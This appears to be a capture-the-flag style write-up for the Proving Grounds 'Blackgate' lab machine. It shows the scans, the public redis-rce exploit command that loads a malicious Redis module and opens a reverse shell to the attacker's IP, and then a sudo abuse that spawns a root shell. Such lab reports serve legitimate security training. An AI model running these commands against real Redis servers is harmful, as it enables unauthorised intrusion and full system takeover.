# Report-Blackgate

## Engagement Overview

Laboratory: Offensive Security Proving Grounds

Target Name: Blackgate

Target IP Address: 192.168.227.176

Operating System: Linux

## Information Gathering:

Full Nmap scan of all ports:

```bash
nmap -sC -sV -p- 192.168.227.176
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 11:27 +0100
Nmap scan report for 192.168.227.176
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.22 seconds

```

Scanning port 6379:
```bash
nmap --script redis-info -sV -p 6379 192.168.227.176
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 11:35 +0100
Nmap scan report for 192.168.227.176
Host is up (0.034s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.14 (64 bits)
| redis-info: 
|   Version: 4.0.14
|   Operating System: Linux 5.8.0-63-generic x86_64
|   Architecture: 64 bits
|   Process ID: 872
|   Used CPU (sys): 0.31
|   Used CPU (user): 0.14
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 882.46K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|   Client connections: 
|_    192.168.45.234

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds

```
redis version 4.0.14

Searching Exploit-DB for  PoC on Redis's vulnerability: 

Proof of concept Code: https://github.com/Ridter/redis-rce, https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

## Initial Access

Vulnerability Exploited: Unauthenticated Redis Remote Code Execution

Vulnerability Explanation:The Redis service running on port 6379 was exposed without authentication. 
This allowed unauthenticated remote clients to load a malicious Redis module, 
resulting in arbitrary command execution and initial access to the system.


### Exploitation:

The following public proof-of-concept repositories were used to exploit the identified vulnerability:
```bash
git clone https://github.com/Ridter/redis-rce
```
```bash
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```

A malicious Redis module was required to achieve code execution. The default build process failed, requiring manual modification of the source code to successfully compile the shared object.
The source file module.c was modified to include the required header files in order to successfully compile the module:

```
#include <arpa/inet.h>
#include <string.h>
```

<img width="776" height="483" alt="Pasted image 20260120115651" src="https://github.com/user-attachments/assets/491897e6-3731-4914-ab51-ede8effda114" />

A malicious Redis module was required in order to achieve remote code execution. 
After fixing the compilation issues in the RedisModules-ExecuteCommand repository, the module was successfully compiled by executing the make command inside the src directory:
```
make
```

As a result, the shared object file module.so was created within the RedisModules-ExecuteCommand directory.


<img width="629" height="61" alt="Pasted image 20260120115714" src="https://github.com/user-attachments/assets/f9d580b0-e6a4-4ca6-834b-6f2cdbdacc9c" />

The previously downloaded redis-rce exploit script was then used to load the malicious module into the target Redis instance. 
The following command was executed to trigger the exploitation and establish a reverse shell:

 
```bash
python3 redis-rce.py -r 192.168.227.176 -p 6379 -L 192.168.45.234 -P 6379 -f ~/oscp/proving_grounds/blackgate/RedisModules-ExecuteCommand/module.so
```
We used the reverse shell configuration.

<img width="1079" height="447" alt="Pasted image 20260120115819" src="https://github.com/user-attachments/assets/766955d5-0f29-4a3f-bf29-7eaf931b1f9d" />

A reverse shell connection was successfully obtained as the user "prudence".
To improve shell stability, a pseudo-terminal was spawned using the following command:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<img width="528" height="137" alt="Pasted image 20260120120129" src="https://github.com/user-attachments/assets/323ee692-7bee-47b5-99d4-4e8c54bde7e7" />

## Privileged Escalation


Vulnerability Exploited: Misconfigured Sudo Permissions

Vulnerability Explanation: The user "prudence" was allowed to execute the binary /usr/local/bin/redis-status as root without authentication. 
The binary permitted execution of system commands, which was abused to spawn a root shell.


## Enumeration:

The sudo configuration revealed that the user "prudence" was allowed to execute the binary 
/usr/local/bin/redis-status as root without providing a password.

```
sudo -l
```
 (root) NOPASSWD: /usr/local/bin/redis-status


<img width="718" height="123" alt="Pasted image 20260120120254" src="https://github.com/user-attachments/assets/cecc85e2-f89a-41ae-82f4-52b81909a53e" />

## Exploitation:

```bash
sudo  /usr/local/bin/redis-status
```

<img width="456" height="72" alt="Pasted image 20260120120409" src="https://github.com/user-attachments/assets/518243ff-4b58-4b46-a5ec-f4f6e38f3960" />

The binary /usr/local/bin/redis-status was executable as root without authentication. 
By analyzing the binary, an embedded authorization key was identified using the strings utility.


```bash
strings /usr/local/bin/redis-status
```

<img width="485" height="337" alt="Pasted image 20260120120638" src="https://github.com/user-attachments/assets/529f9803-9251-4cbb-b410-2401826dae64" />

After providing the correct authorization key, the application allowed execution of system commands. 
This functionality was abused to spawn a root shell by invoking /bin/bash.
we can read the authorization key with:
```bash
sudo  /usr/local/bin/redis-status
```
```
!/bin/bash
```


<img width="458" height="185" alt="Pasted image 20260120120939" src="https://github.com/user-attachments/assets/ddde1170-be28-48b3-9ad0-f002b979e597" />

As a result, a shell with root privileges was obtained.
